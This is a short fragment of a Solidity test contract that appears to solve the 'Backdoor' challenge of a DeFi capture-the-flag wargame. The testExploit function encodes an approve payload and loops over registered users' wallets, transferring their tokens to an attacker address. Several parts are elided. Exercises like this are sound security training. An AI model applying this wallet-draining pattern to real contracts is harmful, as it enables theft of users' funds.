...
contract Backdoor is Test {
    ...
    function testExploit() public {
        ...
        bytes memory payload_approve = abi.encodeWithSignature("fowardApprove(address,address)", address(dvt), attacker);

        for(uint i=0;i<NUM_USERS;i++){
            address[] memory curr_user = new address[](1);
            curr_user[0] = users[i];
            ...
            dvt.transferFrom(walletRegistry.wallets(users[i]), attacker, AMOUNT_TOKENS_DISTRIBUTED/NUM_USERS);
        }
        /** EXPLOIT END **/
        validation();
    }
